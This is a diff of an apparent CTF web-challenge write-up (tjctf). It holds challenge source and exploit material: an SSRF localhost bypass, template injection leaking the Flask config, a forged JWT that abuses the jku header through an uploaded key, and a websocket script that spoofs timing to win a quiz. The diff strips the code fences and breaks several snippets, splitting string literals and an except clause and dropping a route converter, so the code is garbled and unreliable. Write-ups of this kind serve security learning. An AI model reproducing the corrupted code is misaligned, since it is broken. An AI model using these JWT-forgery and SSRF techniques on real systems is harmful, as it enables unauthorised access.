@@ -7,11 +7,6 @@
 ```
 User-agent: *
 Disallow: /secret-frogger-78570618/
-```
-
-
-
-```
 @app.route("/monitor")
 def monitor():
  if request.remote_addr in ("localhost", "127.0.0.1"):
@@ -20,22 +15,14 @@ def monitor():
  )
  else:
  return render_template("admin.html", message="Unauthorized access", errors="")
-```
-
-
-
-```
 app.get('/flag', (req, res) => {
- if (req.ip !== '::ffff:127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
+ if (req.ip !== '::
+ffff:
+127.0.0.1' && req.ip !== '::1' && req.ip !== '127.0.0.1')
  return res.send('bad ip');
 
  res.send(`hey myself! here's your flag: ${flag}`);
 });
-```
-
-
-
-```
 app.post('/fetch', async (req, res) => {
  const url = req.body.url;
 
@@ -57,11 +44,6 @@ app.post('/fetch', async (req, res) => {
 
  res.send(fetched);
 });
-```
-
-
-
-```
 from flask import Flask, request, redirect
 import re
 
@@ -92,7 +74,7 @@ def add_template_key():
 @app.route('/template', methods=['POST'])
 def template_route():
  s = request.form['template']
- 
+
  s = template(s)
 
  if flag in s[0]:
@@ -117,18 +99,8 @@ def template(s):
 
 if __name__ == '__main__':
  app.run(port=5000)
-```
-
-
-
-```
 if key not in template_keys:
  return f'Key {key} not found!', 500
-```
-
-
-
-```
 @app.route("/create_playlist", methods=["POST"])
 def post_playlist():
  …
@@ -140,23 +112,13 @@ def post_playlist():
  f.write(filled)
  …
 
-@app.route("/view_playlist/<uuid:name>")
+@app.route("/view_playlist/")
 def view_playlist(name):
  name = str(name)
  …
  return render_template(f"uploads/{name}.html")
  …
-```
-
-
-
-```
 ORDER #0001 for <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
-```
-
-
-
-```
 @app.route("/flag")
 @login_required()
 def get_flag(user):
@@ -164,11 +126,6 @@ def get_flag(user):
  return flag
  else:
  return "admins only! shoo!"
-```
-
-
-
-```
 def verify_token(token):
  try:
  header = jwt.get_unverified_header(token)
@@ -181,14 +138,10 @@ def verify_token(token):
  public_key = jwt.algorithms.ECAlgorithm.from_jwk(key)
  payload = jwt.decode(token.encode(), public_key, algorithms=["ES256"])
  return payload
- except Exception:
+ 
+except Exception:
  pass
  return None
-```
-
-
-
-```
 @app.route("/upload", methods=["POST"])
 @login_required()
 def post_upload(user):
@@ -208,11 +161,6 @@ def post_upload(user):
  user_files[uid] = {}
  user_files[uid][fid] = f
  return redirect(f"/?success=Successfully+uploaded+file&path={uid}/{fid}")
-```
-
-
-
-```
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization
 from jwcrypto import jwk
@@ -244,21 +192,11 @@ with open("ec_public_key.jwk", "w") as public_file:
  public_file.write(jwk_public.export())
 
 print("鍵ペアをJWK形式でファイルに保存しました。")
-```
-
-
-
-```
 {
  "keys": [
  <<< ここにec_public_key.jwk >>>
  ]
 }
-```
-
-
-
-```
 header
 {
  "alg": "ES256",
@@ -271,19 +209,9 @@ payload
 {
  "id": "admin"
 }
-```
-
-
-
-```
 GET /flag HTTP/2
 Host: topplecontainer.tjc.tf
 Cookie: token=eyJhbGciOiJFUzI1NiIsImprdSI6Ii4uL3VwbG9hZHMvMGQyNTE0NDgtYWM3MS00YTFkLWI3MDItMTM2YjFmMmFkMTdkL2JkYTVjNDEwLTUyMzItNDQ1Zi04YzFhLWZmM2E0Yjg4YTBlYSIsImtpZCI6IjNtU3daT1NUMm1kWnZrc1B2ZVcwVlZ6SWtxMEMwc0VId2x4QzNPaFI0TEUiLCJ0eXAiOiJKV1QifQ.eyJpZCI6ImFkbWluIn0._k6T_FenUSRVYQ2g4Fu0lBUo8sNZXOtwtPRQdLTtKcjtu9Ye-89qxcZSAAW3Lkm9u1fMDkecCGoLDSBE6HLurQ
-```
-
-
-
-```
 @sock.route('/room/<room_id>')
 def room_sock(sock, room_id):
  sock.send(b64encode(kahoot['name'].encode()))
@@ -323,30 +251,11 @@ def room_sock(sock, room_id):
  'end': True,
  'message': f'omg congrats, swiftie!!! {flag}' if get_score(scores, room_id, data['id']) >= 1000 * len(kahoot['questions']) else 'sucks to suck brooooooooo'
  }).encode()))
-```
-
-
-
-```
 {"send_time": 1716177131.8692849, "scores": [], "question": "what is the best taylor swift song?", "answers": ["cruel summer", "daylight (stosp's version)", "all too well (10 minute version)", "all too well (5 minute version)"], "answer": 1}
-```
-
-
-
-```
-{"id":"cfa6030d-6c73-c262-b872-b37e2c045dd3","answer":0,"send_time":1716177131.8692849}
-```
-
-
-
-```
+{"id":"cfa6030d-6c73-c262-b872-b37e2c045dd3","answer":0,"send_time":
+1716177131.8692849}
 if i == 0:
  edit_score(scores, room_id, data['id'], 0)
-```
-
-
-
-```
 def edit_score(scores, room_id, uid, new_score):
  for i, score_data in enumerate(scores):
  if score_data[1] == uid:
@@ -370,16 +279,12 @@ edit_score(scores,
  room_id,
  data['id'],
  get_score(scores, room_id, data['id']) + 1000 + max((send_time - recv_time) * 50, -500))
-```
-
-
-
-```
 import asyncio, websockets, binascii, random, string, json
 from base64 import b64decode, b64encode
 
 async def solve():
- #uri = "ws://localhost:4444"
+ #uri = "ws://localhost:
+4444"
  uri = 'wss://kaboot-b7598a0831b4faf3.tjc.tf'
  room_id = "".join(random.choices(string.ascii_letters, k=8))
 
@@ -406,6 +311,6 @@ async def solve():
  resp = json.loads(b64decode(resp).decode())
 
  print(resp)
- 
+
 asyncio.get_event_loop().run_until_complete(solve())
 ```
